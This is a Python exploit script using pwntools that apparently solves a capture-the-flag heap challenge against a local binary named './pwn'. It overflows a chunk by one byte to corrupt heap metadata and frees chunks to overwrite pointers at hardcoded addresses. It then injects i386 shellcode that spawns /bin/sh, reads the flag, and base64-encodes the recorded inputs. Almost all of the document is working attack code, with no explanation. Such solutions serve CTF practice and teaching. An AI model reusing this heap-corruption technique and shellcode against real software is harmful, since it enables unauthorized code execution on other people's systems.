from pwn import *

import base64

context.log_level = 'debug'

context.terminal = ['gnome-terminal','-x','bash','-c']

context.binary='./pwn'

r=process('./pwn')

r.recvuntil('Please input:')



ans = ''



def add(length, conetent):

    global ans

    r.sendline('1')

    ans += '1\n'

    r.sendline(str(length))

    ans += str(length)+'\n'

    r.send(conetent)

    ans += conetent



def free(idx):

    global ans

    r.sendline('2')

    ans += '2'+'\n'

    r.sendline(str(idx))

    ans += str(idx)+'\n'



def edit(idx,conetent):

    global ans

    r.sendline('3')

    ans += '3\n'

    r.sendline(str(idx))

    ans += str(idx)+'\n'

    r.send(conetent)

    ans += conetent





add(0x2c,'a'*0x2c)

add(0x2c,'a'*0x2c)

add(0x2c,'a'*0x2c)

add(0x2c,'a'*0x2c)

add(0x2c,'a'*0x2c)

add(0x2c,'a'*0x2c)

add(0x31,'aim'+'\n')

edit(0,'b'*0x2c)

edit(0,'c'*0x2c+'\x41')

edit(2,'d'*0xc+p32(0x11)+p32(0)*3+p32(0x1)+'\n')

free(1)

free(3)

free(4)

free(2)

add(0x3c,'e'*0x2c+p32(0x31)+p32(0x080EBA14)+'\n')#1

add(0x2c,'k'*0x2c)#2

#gdb.attach(r)

shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'

add(0x2c,shellcode.ljust(0x24,'\x00')+p32(0x80EB4F0)+'\n')#3

edit(0,p32(0x80eba1c)+'\n')

free(0)

r.sendline('cat flag')
#r.interactive()

ans += 'cat flag\n'

ans = base64.b64encode(ans)

print(ans)

